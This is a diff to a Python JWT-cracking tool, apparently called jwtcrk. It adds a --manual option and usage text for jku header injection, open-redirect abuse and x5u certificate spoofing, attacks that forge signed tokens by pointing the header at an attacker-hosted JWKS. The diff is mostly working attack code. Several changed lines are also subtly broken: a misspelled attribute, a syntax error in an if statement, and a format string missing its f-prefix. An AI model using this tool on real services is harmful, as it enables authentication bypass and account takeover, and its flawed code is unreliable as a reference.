@@ -86,10 +86,23 @@ class Cracker:
                                     the first part of the url, '/.well-known/jwks.json' will be
                                     automatically appended. Look at the examples for more details.]
            --jku-redirect <mainURL,yourURl>
-                                   [Try to use an open redirect to make toe jku header point to
+                                   [Try to use an open redirect to make the jku header pointing to
                                     your url. To do this you need to specify the exact place in
                                     the main url, where your url has to be attached. This is done
                                     with the keyword HERE. Look at the examples for more details.]
+           --jku-body <mainURL>    [Try to exploit an http header injection to inject the jwks in
+                                    the http response of the url. Use the HERE keyword to let the
+                                    tool know where to inject the jwks.]
+           --x5u-basic <yourURL>   [Same as --jku-basic but with x5u header. The x5u allow to link
+                                    an url to a jwks file containing a certificate. The tool will
+                                    generate a certificate an wiil craft a proper jwks file.]
+           --manual                [This bool flag allow you to manually craft an url for the jku
+                                    or x5u header, if used with --jku-basic or --x5u-basic.
+                                    This is needed since in some situations, automatic options
+                                    could be a limit. So if you need to pass a defined url, pass
+                                    this option, and in the url you specified in --jku-basic or
+                                    --x5u-basic, the tool won't append anythin. This option is not
+                                    compatible with other jku/x5u options.]
         
         Examples:
         jwtcrk <token> --decode
@@ -109,7 +122,7 @@ class Cracker:
 {Bcolors.HEADER}Command:{Bcolors.ENDC} {Bcolors.OKCYAN}{" ".join(command)}{Bcolors.ENDC}
         """
 
-    def __init__(self, token, alg, path_to_key, user_payload, remove_from, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, unverified=False, decode=False):
+    def __init__(self, token, alg, path_to_key, user_payload, remove_from, auto_try, kid, specified_key, jku_basic, jku_redirect, jku_header_injection, x5u_basic, unverified=False, decode=False, manual=False):
         """
         :param token: The user input token -> str.
         :param alg: The algorithm for the attack. HS256 or None -> str.
@@ -148,6 +161,7 @@ class Cracker:
         self.x5u_basic = x5u_basic
         self.unverified = unverified
         self.decode = decode
+        self.manual = manual
         self.jwks_args = [self.jku_basic, self.jku_redirect, self.jku_header_injection, self.x5u_basic]
         self.x5u_command = 'openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out testing.crt -subj "/C=US/State=Ohio/L=Columbus/O=TestingInc/CN=testing"'
         self.devnull = open(os.devnull, 'wb')
@@ -215,6 +229,11 @@ class Cracker:
             if self.alg is not None and self.alg != "RS256":
                 print(f"{Bcolors.WARNING}WARNING: With jku/x5u injections, alg will be forced to RS256.{Bcolors.ENDC}")
             self.alg = "RS256"
+        """--manual can be used only with jku-basic or x5u-basic"""
+        if self.manual:
+            if not self.jku_basic and not self.x5u.basic:
+                print(f"{Bcolors.FAIL}ERROR: You can use --manual only with jku/x5u basic.{Bcolors.ENDC}")
+                sys.exit(1)
         """Validate key"""
         # MAYBE THIS STEP COULD BE INCLUDED IN THE PREVIOUS ONE???
         if any(arg is not None for arg in self.jwks_args):
@@ -289,8 +308,13 @@ class Cracker:
         parameters have been called along with -d itself.
 
         """
-        other_args = [self.alg, self.path_to_key, self.user_payload, self.auto_try, self.kid, self.specified_key, self.jku_basic, self.jku_redirect, self.jku_header_injection, self.remove_from, self.x5u_basic]
-        if any(arg is not None for arg in other_args) or self.unverified:
+        other_args = [
+                      self.alg, self.path_to_key, self.user_payload,
+                      self.auto_try, self.kid, self.specified_key,
+                      self.jku_basic, self.jku_redirect, self.jku_header_injection,
+                      self.remove_from, self.x5u_basic,
+        ]
+        if any(arg is not None for arg in other_args) or self.unverified, or self.manual:
             print(f"{Bcolors.WARNING}WARNING: You have not to specify any other argument if you want to decode the token{Bcolors.ENDC}", Cracker.usage)
         print(f"{Bcolors.HEADER}Header:{Bcolors.ENDC} {Bcolors.OKCYAN}{self.original_token_header}{Bcolors.ENDC}" +
               "\n" +
@@ -323,7 +347,10 @@ class Cracker:
             if "jku" not in header_dict.keys():
                 print(f"{Bcolors.FAIL}ERROR: JWT header has not jku.{Bcolors.ENDC}")
                 sys.exit(2)
-            your_url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
+            if self.manual:
+                your_url = self.jku_basic
+            else:
+                your_url = self.jku_basic.rstrip("/") + "/.well-known/jwks.json"
             self.jku_basic_attack(header_dict)
             header_dict['jku'] = your_url
         elif self.jku_redirect:
@@ -425,6 +452,7 @@ class Cracker:
             (self.key.pub.n).to_bytes((self.key.pub.n).bit_length() // 8 + 1, byteorder='big')
         ).decode('utf-8').rstrip("=")
         body = json.dumps(jwks_dict)
+        os.remove(filename)
         return body
 
     def x5u_basic_attack(self, header):
@@ -438,12 +466,11 @@ class Cracker:
         else:
             filename = header['x5u'].split("/")[-1] if header['x5u'].split("/")[-1].endswith(".json") else header['x5u'].split("/")[-2]
         with open("testing.crt", 'r') as cert_file:
-            my_cert = "".join([line.strip() for line in cert_file if not line.startswith('---')])
+            x5c_ = "".join([line.strip() for line in cert_file if not line.startswith('---')])
         jwks = open(filename)
         jwks_dict = json.load(jwks)
-        jwks_dict['x5c'] = my_cert
-        #change something else
-        file = open("crafted/jwks.json", 'w')
+        jwks_dict['keys'][0]['x5c'] = x5c_
+        file = open("{cwd}crafted/jwks.json", 'w')
         file.write(json.dumps(jwks_dict))
         file.close()
         os.remove(filename)
@@ -811,13 +838,17 @@ if __name__ == '__main__':
                         help="Specify your ip or domain to host the jwks.json file",
                         metavar="<yourURL>", required=False
                         )
+    parser.add_argument("--manual", action="store_true",
+                        help="Specify this flag with jku/x5u basic if you need to craft an url without the tool appending or replaceing anything to it",
+                        required=False
+                        )
 
     # Parse arguments
     args = parser.parse_args()
 
     cracker = Cracker(
         args.token, args.alg, args.key, args.payload, args.remove_from, args.auto_try, args.inject_kid,
-        args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.unverified, args.decode
+        args.specify_key, args.jku_basic, args.jku_redirect, args.jku_body, args.x5u_basic, args.unverified, args.decode, args.manual
     )
     # print(args.payload)	# DEBUG
     # print(cracker.key)	# DEBUG
